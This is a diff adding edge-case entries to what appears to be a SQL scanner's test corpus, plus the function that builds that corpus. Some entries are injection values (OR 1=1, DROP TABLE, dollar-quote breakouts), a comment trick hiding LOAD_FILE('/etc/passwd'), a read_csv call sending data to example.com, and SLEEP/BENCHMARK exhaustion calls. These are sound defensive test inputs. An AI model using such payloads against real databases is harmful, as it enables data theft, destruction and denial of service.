+  ["fix14:fn-mysql-sleep", "SELECT SLEEP(100), BENCHMARK(1e12, MD5('x')), GET_LOCK('a', 10)"],
+  ["fix14:duckdb-egress", "SELECT * FROM read_csv('https://example.com/?' || (SELECT 1))"],
+  // More T-SQL statement words (fix 14).
+  ["fix14:mssql-setuser", "SELECT 1 AS a SETUSER 'bob'"],
+  ["fix14:mssql-revert", "SELECT 1 AS a REVERT"],
+  ["fix14:mssql-add", "SELECT 1 AS a ADD SENSITIVITY CLASSIFICATION TO dbo.t.c WITH (LABEL = 'x')"],
+  ["fix14:mssql-open", "SELECT 1 AS a OPEN SYMMETRIC KEY k DECRYPTION BY PASSWORD = 'x'"],
+  ["fix14:mssql-checkpoint", "SELECT 1 AS a CHECKPOINT"],
+  ["fix14:mssql-end-conversation", "SELECT 1 AS a END CONVERSATION 'x'"],
+  ["fix14:mssql-move-conversation", "SELECT 1 AS a MOVE CONVERSATION 'x' TO 'y'"],
+  ["fix14:mssql-disable-trigger", "SELECT 1 AS a DISABLE TRIGGER ALL ON DATABASE"],
+  ["fix14:mssql-print", "SELECT 1 AS a PRINT 'x' RAISERROR('y', 1, 1)"],
+  ["fix14:mssql-case-end", "SELECT CASE WHEN a = 1 THEN 'x' END AS b FROM t"],
+  // Postgres with standard_conforming_strings off (fix 14).
+  ["fix14:pg-backslash-reading", String.raw`SELECT 'a\' -- ', 1 INTO t -- '`],
+  // Not destructive (fix 11).
+  ["fix11:trigger-after-update", "CREATE TRIGGER tr ON t AFTER UPDATE AS SELECT 1"],
+  ["fix11:trigger-instead-of-delete", "CREATE TRIGGER tr ON t INSTEAD OF DELETE AS SELECT 1"],
+  ["fix11:trigger-event-list", "CREATE TRIGGER tr ON t AFTER INSERT, UPDATE, DELETE AS SELECT 1"],
+  [
+    "fix11:pg-trigger-or",
+    "CREATE TRIGGER tr BEFORE INSERT OR UPDATE ON t FOR EACH ROW EXECUTE FUNCTION f()",
+  ],
+  ["fix11:grant", "GRANT DELETE, UPDATE ON t TO u"],
+  ["fix11:revoke", "REVOKE UPDATE ON t FROM u"],
+  ["fix11:if-update", "IF UPDATE(col) SELECT 1"],
+  ["fix11:update-statistics", "UPDATE STATISTICS t"],
+  ["fix11:explain-costs-delete", "EXPLAIN (COSTS OFF) DELETE FROM t"],
+  ["fix11:explain-analyze-option-delete", "EXPLAIN (ANALYZE) DELETE FROM t"],
+  // Word characters follow each engine's identifier rule (fix 19).
+  ["fix19:thai", "SELECT * FROM ตารางที่ WHERE ชื่อ = 1"],
+  ["fix19:devanagari", "SELECT * FROM तालिका; SELECT 2"],
+  ["fix19:nfd", "SELECT * FROM cafe\u0301 LIMIT 1"],
+  ["fix19:astral", "SELECT * FROM 𝒯able; SELECT '𝒯'"],
+  ["fix19:mark-on-keyword", "SELECT 1 INTO\u0301 t"],
+  ["fix19:mark-glued-into", "SELECT 1 AS a INTÓ t"],
+  ["fix19:astral-tag", "SELECT $𝒯$a;b$𝒯$; SELECT 2", [{}]],
+  ["fix19:mark-tag", "SELECT $e\u0301$ {{p}} ; $e\u0301$ AS s", [{ p: "x" }]],
+  // MySQL: `--` starts a comment only before ASCII space or a control char (fix 10).
+  ["fix10:mysql-dash-nbsp", "SELECT 1 --\u00A0x, LOAD_FILE('/etc/passwd')"],
+  ["fix10:mysql-dash-tab", "SELECT 1 --\tx, 2; SELECT 3"],
+  ["fix10:mysql-dash-nbsp-param", "SELECT 1 --\u00A0{{p}}\n, {{p}}", [{ p: "x" }]],
+  // Parameters: MariaDB runs /*M! … */ (fix 13); DuckDB ends `--` at \r (fix 10).
+  ["fix13:mariadb-exec-param", "SELECT 1 /*M! + {{a}} */, /*! + {{a}} */ {{a}}", [{ a: 5 }]],
+  ["fix10:duckdb-cr-param", "SELECT {{a}} -- note\r, {{a}}", [{ a: "x" }]],
+  // A dollar-quote tag longer than 64 characters (fix 10).
+  [
+    "fix10:long-tag",
+    "SELECT $tttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttt$ {{p}}; $tttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttt$; SELECT 2",
+    [{ p: "x" }],
+  ],
+  // Postgres and DuckDB end a `--` comment at `\r` (fix 10).
+  ["fix10:cr-comment", "SELECT 1; -- note\r; SELECT 2"],
+  ["fix10:cr-comment-limit", "SELECT a FROM t -- x\rLIMIT 5"],
+  // Forced inline: negative numbers (fix 13).
+  ["fix13:negative-inline", "SELECT 1-{{p}}, '{{p}}'", [{ p: -1 }, { p: -2.5 }]],
+  [
+    "fix13:mysql-strings",
+    "SELECT '{{p}}', \"{{p}}\" -- {{p}}\n/*! + {{p}} */",
+    [{ p: "a'b\"c\\d" }],
+  ],
+  // Values that could break out of their literal (fix 13, Task 4 review).
+  // A value that forms the closing $tag$ with the text next to it.
+  ["fix13:tag-edge-start", "SELECT $$Cost: ${{p}}$$", [{ p: "$ || 'INJ' --" }, { p: "5" }]],
+  ["fix13:tag-edge-end", "SELECT $${{p}}$ tail$$", [{ p: "x$" }, { p: "x" }]],
+  ["fix13:tag-edge-partial", "SELECT $tag$ $ta{{p}} $tag$", [{ p: "g$ || 'INJ' --" }, { p: "g" }]],
+  [
+    "fix13:tag-edge-two-values",
+    "SELECT $${{a}}{{b}}$$",
+    [
+      { a: "x$", b: "$y" },
+      { a: "x", b: "$y" },
+    ],
+  ],
+  ["fix13:tag-edge-unterminated", "SELECT $$ ${{p}}", [{ p: "$x" }, { p: "x" }]],
+  // `\{{p}}` in a string that takes backslash escapes is escaped text.
+  [
+    "fix13:escaped-param",
+    String.raw`SELECT E'\{{p}}', '\{{p}}', "\{{p}}", E'\\{{p}}', E'\\\{{p}}'`,
+    [{ p: "' OR 1=1 --" }],
+  ],
+  ["fix13:escaped-param-run", String.raw`SELECT '{{a}}\{{b}}', '\\{{b}}'`, [{ a: "x", b: "y" }]],
+  // A decimal whose text isn't a finite decimal number.
+  [
+    "fix13:decimal-check",
+    "SELECT {{d}}, '{{d}}', $${{d}}$$",
+    [
+      { d: new SqlDecimal("1; DROP TABLE t") },
+      { d: new SqlDecimal("NaN") },
+      { d: new SqlDecimal("-.5e3") },
+      { d: new SqlDecimal("+1.") },
+    ],
+  ],
+  // A value inlined right after a quote, or right before a word or `$`.
+  [
+    "fix13:adjacent-quote",
+    String.raw`SELECT E'a'{{p}}, 'b'{{p}}, "c"{{p}}, ` + "`d`" + String.raw`{{p}}, x'{{p}}'`,
+    [{ p: "\\" }, { p: String.raw`\') OR 1=1 --` }],
+  ],
+  [
+    "fix13:adjacent-word",
+    "SELECT {{p}}$t$ x $t$, {{p}}AS a, {{p}}{{p}}, {{p}}é, ({{p}})",
+    [{ p: null }, { p: 1 }, { p: true }, { p: -1 }, { p: "s" }],
+  ],
+  ["fix13:adjacent-dollar-comment", "SELECT {{p}}$$ -- $$ AS v", [{ p: null }, { p: 5 }]],
+  // Integers inline as digits: a bigint, and a number past 2^53.
+  ["fix13:int-digits", "SELECT {{a}}, 1-{{b}}, '{{b}}'", [{ a: 1e18, b: -9007199254740993n }]],
+];
+
+// ---------------------------------------------------------------------------
+
+const SCHEMA_DIRS = ["postgresql", "mysql", "mariadb", "sqlite", "sqlserver", "duckdb"];
+
+export function buildScannerCorpus(): ScannerInput[] {
+  const out: ScannerInput[] = [];
+  const seen = new Map<string, string>();
+  const add = (id: string, sql: string, values?: Record<string, ParamValue>[]) => {
+    const dup = seen.get(sql);
+    if (dup !== undefined && !values) return; // the same SQL from another source adds nothing
+    if (out.some((e) => e.id === id)) throw new Error(`duplicate scanner corpus id ${id}`);
+    seen.set(sql, id);
+    out.push(values ? { id, sql, values } : { id, sql });
+  };
+  for (const [id, sql] of SPIKE) add(id, sql);
+  SQL_SCAN_TEST.forEach((sql, i) => add(`sql-scan-test:${i}`, sql));
+  QUERY_PARAMS_TEST.forEach(([sql, values], i) => add(`query-params-test:${i}`, sql, values));
+  for (const [id, sql, values] of PHASE2_REVIEW) add(id, sql, values);
+  for (const dir of SCHEMA_DIRS) {
+    add(
+      `schema:${dir}`,
+      readFileSync(new URL(`e2e/test-databases/${dir}/schema.sql`, repo), "utf8"),
+    );
+  }
+  for (const qs of Object.values(sampleQueries)) for (const q of qs) add(`sample:${q.id}`, q.query);
+  for (const [id, sql, values] of EDGE) add(id, sql, values);
+  return out;
+}
